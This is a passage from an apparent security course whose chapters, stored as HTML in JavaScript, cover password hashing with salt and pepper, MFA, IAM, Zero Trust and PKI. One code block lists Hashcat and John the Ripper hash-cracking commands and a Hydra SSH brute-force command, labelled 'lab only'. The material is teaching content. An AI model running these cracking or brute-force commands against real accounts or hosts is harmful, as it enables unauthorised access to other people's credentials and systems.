                  <div class="tool-row"><span>MD5</span><span>128-bit</span><span>Broken (collisions)</span></div>
                  <div class="tool-row"><span>SHA-1</span><span>160-bit</span><span>Deprecated</span></div>
                  <div class="tool-row"><span>SHA-256</span><span>256-bit</span><span>Secure</span></div>
                  <div class="tool-row"><span>SHA-3</span><span>Variable</span><span>Secure</span></div>
                  <div class="tool-row"><span>bcrypt</span><span>184-bit+</span><span>Secure (passwords)</span></div>
                  <div class="tool-row"><span>scrypt</span><span>Variable</span><span>Secure (passwords)</span></div>
                  <div class="tool-row"><span>Argon2</span><span>Variable</span><span>Modern, recommended</span></div>
                </div>

                <h4 class="sub-h">Hashing vs Encryption</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Feature</span><span>Hashing</span><span>Encryption</span></div>
                  <div class="tool-row"><span>Direction</span><span>One-way</span><span>Two-way</span></div>
                  <div class="tool-row"><span>Reversible</span><span>No</span><span>Yes (with key)</span></div>
                  <div class="tool-row"><span>Purpose</span><span>Integrity, password storage</span><span>Confidentiality</span></div>
                  <div class="tool-row"><span>Key</span><span>None</span><span>Required</span></div>
                  <div class="tool-row"><span>Example</span><span>SHA-256</span><span>AES</span></div>
                </div>

                <p><strong>Important:</strong> General-purpose hashes (SHA-256) are too fast for password storage — attackers compute billions per second. Use a password-hashing algorithm that is intentionally slow and memory-hard.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Salting In Depth</h3>
                <p>A <strong>salt</strong> is a random value generated for each password. It is typically 16–32 bytes and stored alongside the hash. The salt is not secret; its purpose is uniqueness.</p>

                <h4 class="sub-h">How Salting Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Generate a random salt</div>
                  <div class="step-item"><span class="step-num">2</span> Combine salt + password</div>
                  <div class="step-item"><span class="step-num">3</span> Hash the combination</div>
                  <div class="step-item"><span class="step-num">4</span> Store the salt and the hash together</div>
                  <div class="step-item"><span class="step-num">5</span> At verification: recombine the entered password with the stored salt, hash, and compare</div>
                </div>

                <h4 class="sub-h">Benefits of Salting</h4>
                <ul class="content-list">
                  <li>Defeats rainbow tables</li>
                  <li>Identical passwords produce different hashes</li>
                  <li>Forces attackers to attack each hash individually</li>
                </ul>

                <h4 class="sub-h">Salt Best Practices</h4>
                <ul class="content-list">
                  <li>Use a cryptographically secure RNG</li>
                  <li>At least 16 bytes per salt</li>
                  <li>Unique salt per password</li>
                  <li>Store with the hash</li>
                  <li>Never reuse salts</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Peppering In Depth</h3>
                <p>A <strong>pepper</strong> is a secret value added to the password before hashing. Unlike salt, it is <strong>not stored in the database</strong> — it lives in application code, a config file, or a Hardware Security Module (HSM).</p>

                <h4 class="sub-h">How Peppering Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Generate a long random pepper</div>
                  <div class="step-item"><span class="step-num">2</span> Combine pepper + salt + password</div>
                  <div class="step-item"><span class="step-num">3</span> Hash the combination</div>
                  <div class="step-item"><span class="step-num">4</span> Store only hash and salt — keep the pepper secret</div>
                  <div class="step-item"><span class="step-num">5</span> Verification combines the entered password with salt + secret pepper</div>
                </div>

                <h4 class="sub-h">Benefits of Peppering</h4>
                <ul class="content-list">
                  <li>Adds a defence-in-depth layer</li>
                  <li>Defeats offline cracking after a database leak</li>
                  <li>Protects against insider threats (DB admins)</li>
                </ul>

                <h4 class="sub-h">Pepper Best Practices</h4>
                <ul class="content-list">
                  <li>At least 32 bytes of randomness</li>
                  <li>Store securely — HSM or secrets manager</li>
                  <li>Rotate periodically (requires rehashing all passwords)</li>
                  <li>Never hardcode in source</li>
                  <li>Different pepper per application</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Password Security In Depth</h3>

                <h4 class="sub-h">Password Policies</h4>
                <ul class="content-list">
                  <li>Minimum 12–16 characters</li>
                  <li>Mixed uppercase, lowercase, numbers, symbols</li>
                  <li>No dictionary words or personal info</li>
                  <li>Prevent reuse of last 5–10 passwords</li>
                  <li>Account lockout after 5–10 failures</li>
                </ul>

                <h4 class="sub-h">Multi-Factor Authentication</h4>
                <ul class="content-list">
                  <li>Something you know — password</li>
                  <li>Something you have — phone, token, smart card</li>
                  <li>Something you are — biometrics</li>
                  <li>Somewhere you are — location</li>
                  <li>Something you do — behaviour</li>
                </ul>

                <h4 class="sub-h">Password Managers</h4>
                <p>Generate and store strong, unique passwords; encrypt the vault with a master password; auto-fill and sync. Examples: Bitwarden, 1Password, KeePass.</p>

                <h4 class="sub-h">Passwordless Authentication</h4>
                <ul class="content-list">
                  <li><strong>FIDO2/WebAuthn</strong> — public-key cryptography</li>
                  <li><strong>Magic links</strong> — sent via email</li>
                  <li><strong>OTP</strong> — one-time passwords via SMS or app</li>
                  <li><strong>Biometrics</strong> — fingerprint, face</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Attack Vectors &amp; Defensive Controls</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Password Attacks</span>
                    <ul>
                      <li><strong>Brute Force</strong> — Try all combinations</li>
                      <li><strong>Dictionary Attack</strong> — Common passwords</li>
                      <li><strong>Credential Stuffing</strong> — Leaked credentials reused</li>
                      <li><strong>Password Spraying</strong> — Common passwords across many accounts</li>
                      <li><strong>Rainbow Tables</strong> — Precomputed hashes (defeated by salting)</li>
                      <li><strong>Phishing</strong> — Trick users into revealing credentials</li>
                      <li><strong>Keylogging / Shoulder Surfing</strong> — Capture credentials in person</li>
                      <li><strong>Hash Cracking</strong> — GPU/ASIC offline attacks</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li>Use Argon2id, scrypt, or bcrypt</li>
                      <li>Cost factor ~100ms per hash</li>
                      <li>Unique salt per password (16+ bytes)</li>
                      <li>Secret pepper stored securely (HSM)</li>
                      <li>Never use MD5, SHA-1, or plain SHA-256</li>
                      <li>Enforce 12+ character passphrases</li>
                      <li>Check against breached password lists (HIBP)</li>
                      <li>Lockout + rate limiting + MFA</li>
                      <li>Monitor credential-stuffing patterns</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Common Password Auditing Commands</h4>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Hashcat / John / Hydra</span></div>
                  <pre><code># Hashcat — crack MD5 / NTLM
hashcat -m 0 hash.txt wordlist.txt
hashcat -m 1000 hash.txt wordlist.txt

# John the Ripper — MD5
john --format=raw-md5 hash.txt

# Hydra — SSH brute force (lab only)
hydra -l user -P passlist.txt ssh://target</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Hashing is one-way; encryption is two-way.</li>
                  <li>Salting adds a unique random value per password — defeats rainbow tables.</li>
                  <li>Peppering adds a secret value not stored in the database.</li>
                  <li>Password hashing algorithms (Argon2, bcrypt, scrypt) are intentionally slow.</li>
                  <li>Never store plaintext or fast hashes (MD5, SHA-1).</li>
                  <li>Combine MFA, strong policy, and password managers.</li>
                  <li>Attacks: brute force, dictionary, credential stuffing, rainbow tables.</li>
                  <li>Defences: strong hashing + salt + pepper, MFA, monitoring, HIBP checks.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — Password Storage Cheat Sheet</a>
                  <a href="https://pages.nist.gov/800-63-3/sp800-63b.html" target="_blank" rel="noopener">NIST SP 800-63B — Digital identity guidelines</a>
                  <a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">HaveIBeenPwned — Breach check</a>
                  <a href="https://bitwarden.com/" target="_blank" rel="noopener">Bitwarden — Password manager</a>
                  <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef — Hashing playground</a>
                </div>
              </section>
            ` },
                    { id: "2.4", title: "2FA/MFA, IAM & Zero Trust", pages: "225-238", read: 18,
            build: "Configure TOTP for SSH and map an IAM lifecycle.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>2FA (Two-Factor Authentication)</strong> requires two different types of evidence (factors) to verify identity. It adds a layer beyond passwords, making unauthorized access significantly harder even if the password is compromised.</p>
                <p><strong>MFA (Multi-Factor Authentication)</strong> is a broader term requiring two or more factors. 2FA is a subset of MFA. Factors come from categories: something you know, something you have, something you are, somewhere you are, or something you do.</p>
                <p><strong>IAM (Identity and Access Management)</strong> is a framework of policies, processes, and technologies to manage digital identities and control access. It ensures the right people have the right access at the right time, and that access is revoked when no longer needed.</p>
                <p><strong>Zero Trust</strong> is a security model based on "Never trust, always verify." No user, device, or network is inherently trustworthy, whether inside or outside the corporate perimeter. Every access request is authenticated, authorized, and encrypted before access is granted.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>2FA:</strong> You log into Google with email and password. Google sends a 6-digit code to your phone. Even if someone steals your password, they cannot log in without the code.</li>
                  <li><strong>MFA:</strong> A corporate employee logs into VPN with password (know), hardware token (have), and fingerprint (are). Three factors = MFA.</li>
                  <li><strong>IAM:</strong> A company grants new employees access only to needed tools (least privilege). When they leave, access is revoked immediately. IAM enforces password policies, MFA, and RBAC.</li>
                  <li><strong>Zero Trust:</strong> Even inside the office network, employees must authenticate and their device must be verified before accessing any application. No implicit trust.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. 2FA/MFA In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/2fa-iam-zero-trust.png" alt="2FA/MFA factors, IAM lifecycle, and Zero Trust architecture" />
                  <figcaption>Figure 4.1 — Authentication factors, IAM lifecycle, and Zero Trust principles. MFA, IAM, and Zero Trust together form layered identity security.</figcaption>
                </figure>

                <h4 class="sub-h">Authentication Factors</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Factor</span><span>Description</span><span>Examples</span></div>
                  <div class="tool-row"><span>Something you know</span><span>Knowledge-based</span><span>Password, PIN, security question</span></div>
                  <div class="tool-row"><span>Something you have</span><span>Possession-based</span><span>Phone, hardware token, smart card</span></div>
                  <div class="tool-row"><span>Something you are</span><span>Inherence-based</span><span>Fingerprint, face, iris, voice</span></div>
                  <div class="tool-row"><span>Somewhere you are</span><span>Location-based</span><span>GPS, IP address, network</span></div>
                  <div class="tool-row"><span>Something you do</span><span>Behavior-based</span><span>Typing pattern, gait, swipe pattern</span></div>
                </div>

                <h4 class="sub-h">Types of 2FA/MFA</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span><span>Security Level</span></div>
                  <div class="tool-row"><span>SMS OTP</span><span>Code via text message</span><span>Low (SIM swapping, interception)</span></div>
                  <div class="tool-row"><span>Email OTP</span><span>Code via email</span><span>Low (email compromise)</span></div>
                  <div class="tool-row"><span>TOTP</span><span>Time-based One-Time Password (Google Authenticator, Authy)</span><span>Medium-High</span></div>
                  <div class="tool-row"><span>Push Notification</span><span>Approve/deny on mobile app</span><span>Medium-High</span></div>
                  <div class="tool-row"><span>Hardware Token</span><span>YubiKey, RSA SecurID</span><span>High</span></div>
                  <div class="tool-row"><span>Biometrics</span><span>Fingerprint, face recognition</span><span>High</span></div>
                  <div class="tool-row"><span>Smart Card</span><span>PIV, CAC</span><span>High</span></div>
                </div>

                <h4 class="sub-h">How TOTP Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Server and client share a secret key during setup</div>
                  <div class="step-item"><span class="step-num">2</span> Both use the secret key and current time to generate a 6-digit code</div>
                  <div class="step-item"><span class="step-num">3</span> The code changes every 30 seconds</div>
                  <div class="step-item"><span class="step-num">4</span> User enters the code; server verifies it</div>
                </div>

                <h4 class="sub-h">FIDO2/WebAuthn</h4>
                <ul class="content-list">
                  <li>Uses public-key cryptography</li>
                  <li>No shared secrets</li>
                  <li>Phishing-resistant</li>
                  <li>Supports passwordless authentication</li>
                  <li>Examples: YubiKey, Windows Hello, Touch ID</li>
                </ul>

                <h4 class="sub-h">MFA Fatigue Attacks</h4>
                <p>An attacker repeatedly sends push notifications to a user's phone, hoping the user will approve one out of frustration or confusion. This is a social engineering attack. Mitigation: number matching, rate limiting, and user education.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. IAM In Depth</h3>

                <h4 class="sub-h">Core Components of IAM</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Component</span><span>Function</span></div>
                  <div class="tool-row"><span>Identification</span><span>Who is the user? (username, email)</span></div>
                  <div class="tool-row"><span>Authentication</span><span>Prove identity (password, MFA)</span></div>
                  <div class="tool-row"><span>Authorization</span><span>What can the user do? (permissions, roles)</span></div>
                  <div class="tool-row"><span>Accounting/Auditing</span><span>What did the user do? (logs, reports)</span></div>
                  <div class="tool-row"><span>Provisioning</span><span>Creating accounts and granting access</span></div>
                  <div class="tool-row"><span>De-provisioning</span><span>Revoking access when no longer needed</span></div>
                </div>

                <h4 class="sub-h">IAM Principles</h4>
                <ul class="content-list">
                  <li><strong>Least Privilege:</strong> Give users only the access they need.</li>
                  <li><strong>Separation of Duties:</strong> No single person has complete control.</li>
                  <li><strong>Role-Based Access Control (RBAC):</strong> Access based on job role.</li>
                  <li><strong>Attribute-Based Access Control (ABAC):</strong> Access based on attributes (department, location, time).</li>
                  <li><strong>Just-In-Time (JIT) Access:</strong> Temporary access granted when needed.</li>
                  <li><strong>Principle of Least Astonishment:</strong> Access should match user expectations.</li>
                </ul>

                <h4 class="sub-h">IAM Technologies</h4>
                <ul class="content-list">
                  <li><strong>Directory Services:</strong> Active Directory, LDAP, Azure AD.</li>
                  <li><strong>Single Sign-On (SSO):</strong> One login for multiple applications. Uses SAML, OAuth, OpenID Connect.</li>
                  <li><strong>Identity Providers (IdP):</strong> Okta, Azure AD, Google Workspace.</li>
                  <li><strong>Privileged Access Management (PAM):</strong> Manages admin accounts. Examples: CyberArk, BeyondTrust.</li>
                  <li><strong>Identity Governance:</strong> Manages access reviews, certifications, and compliance.</li>
                </ul>

                <h4 class="sub-h">IAM Lifecycle</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Joiner: New employee gets account and access.</div>
                  <div class="step-item"><span class="step-num">2</span> Mover: Employee changes role; access is updated.</div>
                  <div class="step-item"><span class="step-num">3</span> Leaver: Employee leaves; access is revoked.</div>
                  <div class="step-item"><span class="step-num">4</span> Review: Periodic access reviews to ensure compliance.</div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Zero Trust In Depth</h3>

                <h4 class="sub-h">Core Principles</h4>
                <ul class="content-list">
                  <li><strong>Never Trust, Always Verify:</strong> No implicit trust based on network location.</li>
                  <li><strong>Assume Breach:</strong> Design as if attackers are already inside.</li>
                  <li><strong>Least Privilege:</strong> Minimal access for minimal time.</li>
                  <li><strong>Micro-Segmentation:</strong> Divide network into small zones.</li>
                  <li><strong>Continuous Verification:</strong> Authenticate and authorize every request.</li>
                  <li><strong>Device Health:</strong> Verify device posture before granting access.</li>
                  <li><strong>Encryption Everywhere:</strong> Encrypt data in transit and at rest.</li>
                  <li><strong>Visibility and Analytics:</strong> Monitor all traffic and user behavior.</li>
                </ul>

                <h4 class="sub-h">Traditional vs Zero Trust</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Aspect</span><span>Traditional (Perimeter)</span><span>Zero Trust</span></div>
                  <div class="tool-row"><span>Trust Model</span><span>Trust inside, distrust outside</span><span>Trust nothing, verify everything</span></div>
                  <div class="tool-row"><span>Network</span><span>Flat, perimeter-focused</span><span>Micro-segmented</span></div>
                  <div class="tool-row"><span>Access</span><span>Based on network location</span><span>Based on identity, device, context</span></div>
                  <div class="tool-row"><span>Authentication</span><span>Once at login</span><span>Continuous</span></div>
                  <div class="tool-row"><span>Lateral Movement</span><span>Easy</span><span>Difficult</span></div>
                  <div class="tool-row"><span>Remote Work</span><span>VPN required</span><span>Direct, secure access</span></div>
                </div>

                <h4 class="sub-h">Zero Trust Architecture Components</h4>
                <ul class="content-list">
                  <li><strong>Policy Engine (PE):</strong> Decides whether to grant access.</li>
                  <li><strong>Policy Administrator (PA):</strong> Executes the decision.</li>
                  <li><strong>Policy Enforcement Point (PEP):</strong> Enforces the decision at the resource.</li>
                  <li><strong>Identity Provider (IdP):</strong> Authenticates users.</li>
                  <li><strong>Device Management:</strong> Ensures device compliance.</li>
                  <li><strong>SIEM/SOAR:</strong> Monitors and responds to threats.</li>
                </ul>

                <h4 class="sub-h">Zero Trust Implementation Steps</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Define the protect surface (critical data, assets, applications).</div>
                  <div class="step-item"><span class="step-num">2</span> Map transaction flows.</div>
                  <div class="step-item"><span class="step-num">3</span> Architect a Zero Trust network.</div>
                  <div class="step-item"><span class="step-num">4</span> Create Zero Trust policies.</div>
                  <div class="step-item"><span class="step-num">5</span> Monitor and maintain.</div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attacks on 2FA/MFA</span>
                    <ul>
                      <li><strong>SIM Swapping:</strong> Transfer victim's number to attacker's SIM.</li>
                      <li><strong>SS7 Attacks:</strong> Intercept SMS via telecom signaling.</li>
                      <li><strong>MFA Fatigue:</strong> Bombard user with push notifications.</li>
                      <li><strong>Phishing Kits:</strong> Fake login pages capture OTPs in real time.</li>
                      <li><strong>MITM:</strong> Intercept OTP codes.</li>
                      <li><strong>Malware:</strong> Steal OTP codes from infected devices.</li>
                      <li><strong>Session Hijacking:</strong> Steal session cookies after MFA.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Attacks on IAM &amp; Zero Trust</span>
                    <ul>
                      <li><strong>Credential Stuffing:</strong> Use leaked credentials.</li>
                      <li><strong>Privilege Escalation:</strong> Gain higher access.</li>
                      <li><strong>Insider Threats:</strong> Abuse legitimate access.</li>
                      <li><strong>Orphaned Accounts:</strong> Old accounts not de-provisioned.</li>
                      <li><strong>Misconfigured SSO:</strong> Bypass authentication.</li>
                      <li><strong>Token Theft:</strong> Steal OAuth tokens.</li>
                      <li><strong>Policy Bypass:</strong> Exploit misconfigured policies.</li>
                      <li><strong>Device Spoofing:</strong> Fake device health.</li>
                      <li><strong>API Attacks:</strong> Exploit unsecured APIs.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Defensive Controls</h3>

                <h4 class="sub-h">2FA/MFA Best Practices</h4>
                <ul class="content-list">
                  <li>Use phishing-resistant MFA (FIDO2/WebAuthn).</li>
                  <li>Avoid SMS-based 2FA if possible.</li>
                  <li>Use authenticator apps (TOTP) or hardware tokens.</li>
                  <li>Enforce MFA for all users, especially admins.</li>
                  <li>Implement number matching for push notifications.</li>
                  <li>Educate users about MFA fatigue attacks.</li>
                  <li>Monitor for unusual MFA activity.</li>
                </ul>

                <h4 class="sub-h">IAM Best Practices</h4>
                <ul class="content-list">
                  <li>Implement least privilege.</li>
                  <li>Use RBAC or ABAC.</li>
                  <li>Enforce strong password policies.</li>
                  <li>Enable MFA for all accounts.</li>
                  <li>Implement SSO with secure protocols (SAML, OIDC).</li>
                  <li>Use PAM for privileged accounts.</li>
                  <li>Conduct regular access reviews.</li>
                  <li>Automate provisioning and de-provisioning.</li>
                  <li>Monitor and log all access.</li>
                  <li>Implement Just-In-Time (JIT) access.</li>
                </ul>

                <h4 class="sub-h">Zero Trust Best Practices</h4>
                <ul class="content-list">
                  <li>Start with identity: strong authentication, MFA.</li>
                  <li>Implement micro-segmentation.</li>
                  <li>Use device health checks.</li>
                  <li>Encrypt all traffic.</li>
                  <li>Monitor continuously with SIEM.</li>
                  <li>Automate response with SOAR.</li>
                  <li>Adopt least privilege everywhere.</li>
                  <li>Assume breach and design accordingly.</li>
                  <li>Train employees on security awareness.</li>
                  <li>Regularly test and audit Zero Trust policies.</li>
                </ul>

                <h4 class="sub-h">Combined Defense</h4>
                <p>MFA + IAM + Zero Trust = Layered Identity Security. IAM provides the framework; MFA provides strong authentication; Zero Trust provides continuous verification. Together, they reduce the risk of credential theft, lateral movement, and insider threats.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Essential Commands</h3>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Authentication &amp; IAM Commands</span></div>
                  <pre><code># Generate SSH key for key-based auth
ssh-keygen -t ed25519

# Copy public key to server
ssh-copy-id user@host

# Set up TOTP on Linux
google-authenticator

# Test PAM authentication
pamtester</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>2FA requires two factors; MFA requires two or more.</li>
                  <li>Factors: knowledge, possession, inherence, location, behavior.</li>
                  <li>TOTP and FIDO2 are more secure than SMS.</li>
                  <li>IAM manages identities and access across the organization.</li>
                  <li>Core IAM principles: least privilege, RBAC, separation of duties.</li>
                  <li>Zero Trust: never trust, always verify.</li>
                  <li>Zero Trust assumes breach and enforces continuous verification.</li>
                  <li>Attacks: SIM swapping, MFA fatigue, credential stuffing, privilege escalation.</li>
                  <li>Defenses: phishing-resistant MFA, IAM automation, micro-segmentation, monitoring.</li>
                  <li>Tools: Google Authenticator, YubiKey, Okta, Azure AD, CyberArk.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://fidoalliance.org/" target="_blank" rel="noopener">FIDO Alliance — Passwordless standards</a>
                  <a href="https://csrc.nist.gov/publications/detail/sp/800-207/final" target="_blank" rel="noopener">NIST SP 800-207 — Zero Trust Architecture</a>
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — Authentication Cheat Sheet</a>
                  <a href="https://www.okta.com/" target="_blank" rel="noopener">Okta — IAM platform</a>
                  <a href="https://www.yubico.com/" target="_blank" rel="noopener">YubiKey — Hardware token</a>
                </div>
              </section>
            ` },
                    { id: "2.5", title: "PKI, Digital Signatures & Certificates", pages: "239-256", read: 22,
            build: "Create a self-signed certificate and verify a digital signature.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Public Key Infrastructure (PKI)</strong> is the framework of policies, procedures, hardware, software, and entities that manage digital certificates and public-key encryption. It enables secure electronic transfer of information across networks by binding public keys to identities.</p>
                <p><strong>Digital Signatures</strong> provide authentication, integrity, and non-repudiation. They prove that a message was created by a known sender and was not altered in transit. They are created using the sender's private key and verified using the sender's public key.</p>
                <p><strong>Digital Certificates</strong> are electronic documents that bind a public key to an identity (person, organization, or device). They are issued and digitally signed by a Certificate Authority (CA). Certificates are the foundation of trust on the Internet — HTTPS, email encryption, code signing, and VPNs all rely on them.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>HTTPS (Web Security):</strong> When you visit <code>https://www.google.com</code>, your browser receives Google's digital certificate. The browser verifies the certificate was signed by a trusted CA and matches the domain. This ensures you are talking to the real Google, not an imposter.</li>
                  <li><strong>Code Signing:</strong> Software vendors sign their executables with a digital certificate. Windows and macOS verify the signature before allowing installation, ensuring the software has not been tampered with.</li>
                  <li><strong>Email Encryption (S/MIME):</strong> Organizations use digital certificates to encrypt and sign emails, ensuring confidentiality and proving the sender's identity.</li>
                  <li><strong>VPN Authentication:</strong> Corporate VPNs use certificates to authenticate users and devices before granting access to the internal network.</li>
                  <li><strong>Document Signing:</strong> Legal documents are signed digitally using certificates, providing non-repudiation and legal validity (e.g., Adobe Sign, DocuSign).</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. PKI In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/pki-signatures.png" alt="PKI hierarchy showing Root CA, Intermediate CA, and End-Entity certificates with digital signature verification" />
                  <figcaption>Figure 5.1 — PKI hierarchy and digital signature verification. Root CA signs Intermediate CA; Intermediate CA signs end-entity certificates. Digital signatures use private key to sign, public key to verify.</figcaption>
                </figure>

                <h4 class="sub-h">Core Components of PKI</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Component</span><span>Function</span></div>
                  <div class="tool-row"><span>Certificate Authority (CA)</span><span>Issues and signs digital certificates; trusted third party</span></div>
                  <div class="tool-row"><span>Registration Authority (RA)</span><span>Verifies identity before CA issues certificate</span></div>
                  <div class="tool-row"><span>Certificate Repository</span><span>Stores and distributes certificates and CRLs</span></div>
                  <div class="tool-row"><span>Certificate Revocation List (CRL)</span><span>List of revoked certificates</span></div>
                  <div class="tool-row"><span>Online Certificate Status Protocol (OCSP)</span><span>Real-time certificate revocation checking</span></div>
                  <div class="tool-row"><span>End Entity</span><span>User, device, or service that owns a certificate</span></div>
                </div>

                <h4 class="sub-h">PKI Hierarchy</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Root CA — Trust anchor; self-signed certificate; offline storage</div>
                  <div class="step-item"><span class="step-num">2</span> Intermediate CA — Signed by Root CA; issues end-entity certificates</div>
                  <div class="step-item"><span class="step-num">3</span> End-Entity Certificate — Issued to users, servers, or devices</div>
                </div>

                <h4 class="sub-h">Certificate Types</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Validation Level</span><span>Use Case</span></div>
                  <div class="tool-row"><span>DV (Domain Validated)</span><span>Domain ownership only</span><span>Basic HTTPS</span></div>
                  <div class="tool-row"><span>OV (Organization Validated)</span><span>Domain + organization</span><span>Business websites</span></div>
                  <div class="tool-row"><span>EV (Extended Validation)</span><span>Strict identity verification</span><span>Banks, high-trust sites</span></div>
                  <div class="tool-row"><span>Wildcard</span><span>*.example.com</span><span>Multiple subdomains</span></div>
                  <div class="tool-row"><span>Multi-Domain (SAN)</span><span>Multiple domains</span><span>Shared hosting</span></div>
                  <div class="tool-row"><span>Self-Signed</span><span>No CA validation</span><span>Testing, internal use</span></div>
                </div>

                <h4 class="sub-h">X.509 Certificate Structure</h4>
                <ul class="content-list">
                  <li><strong>Version</strong> — X.509 version (v3 is current)</li>
                  <li><strong>Serial Number</strong> — Unique identifier from CA</li>
                  <li><strong>Signature Algorithm</strong> — Algorithm used to sign (e.g., SHA256-RSA)</li>
                  <li><strong>Issuer</strong> — CA that issued the certificate</li>
                  <li><strong>Validity Period</strong> — Not Before / Not After dates</li>
                  <li><strong>Subject</strong> — Owner's identity (CN, O, OU, C)</li>
                  <li><strong>Subject Public Key Info</strong> — Public key and algorithm</li>
                  <li><strong>Extensions</strong> — Key usage, SAN, CRL distribution points</li>
                  <li><strong>Signature</strong> — CA's digital signature over the certificate</li>
                </ul>

                <h4 class="sub-h">Certificate Lifecycle</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Key Generation — Generate public/private key pair</div>
                  <div class="step-item"><span class="step-num">2</span> CSR Creation — Certificate Signing Request sent to CA</div>
                  <div class="step-item"><span class="step-num">3</span> Identity Verification — CA/RA validates identity</div>
                  <div class="step-item"><span class="step-num">4</span> Certificate Issuance — CA signs and issues certificate</div>
                  <div class="step-item"><span class="step-num">5</span> Deployment — Certificate installed on server/device</div>
                  <div class="step-item"><span class="step-num">6</span> Renewal — Certificate renewed before expiry</div>
                  <div class="step-item"><span class="step-num">7</span> Revocation — Certificate revoked if compromised</div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Digital Signatures In Depth</h3>

                <h4 class="sub-h">What is a Digital Signature?</h4>
                <p>A digital signature is a cryptographic mechanism that provides:</p>
                <ul class="content-list">
                  <li><strong>Authentication</strong> — Proves the signer's identity</li>
                  <li><strong>Integrity</strong> — Proves the message was not altered</li>
                  <li><strong>Non-Repudiation</strong> — Signer cannot deny signing</li>
                </ul>

                <h4 class="sub-h">How Digital Signatures Work</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Sender hashes the message → message digest</div>
                  <div class="step-item"><span class="step-num">2</span> Sender encrypts the hash with their private key → signature</div>
                  <div class="step-item"><span class="step-num">3</span> Sender sends message + signature</div>
                  <div class="step-item"><span class="step-num">4</span> Receiver decrypts signature with sender's public key → original hash</div>
                  <div class="step-item"><span class="step-num">5</span> Receiver hashes the received message</div>
                  <div class="step-item"><span class="step-num">6</span> If hashes match → signature valid, message intact</div>
                </div>

                <h4 class="sub-h">Digital Signature Algorithms</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Algorithm</span><span>Type</span><span>Status</span></div>
                  <div class="tool-row"><span>RSA-PSS</span><span>RSA-based</span><span>Secure</span></div>
                  <div class="tool-row"><span>ECDSA</span><span>Elliptic curve</span><span>Secure, efficient</span></div>
                  <div class="tool-row"><span>EdDSA (Ed25519)</span><span>Edwards curve</span><span>Modern, fast</span></div>
                  <div class="tool-row"><span>DSA</span><span>Discrete log</span><span>Legacy</span></div>
                </div>

                <h4 class="sub-h">Digital Signature vs Electronic Signature</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Feature</span><span>Digital Signature</span><span>Electronic Signature</span></div>
                  <div class="tool-row"><span>Technology</span><span>Cryptographic</span><span>Any electronic mark</span></div>
                  <div class="tool-row"><span>Security</span><span>Strong</span><span>Variable</span></div>
                  <div class="tool-row"><span>Legal</span><span>Non-repudiation</span><span>Depends on jurisdiction</span></div>
                  <div class="tool-row"><span>Verification</span><span>Cryptographic</span><span>Visual/audit trail</span></div>
                </div>

                <h4 class="sub-h">Code Signing</h4>
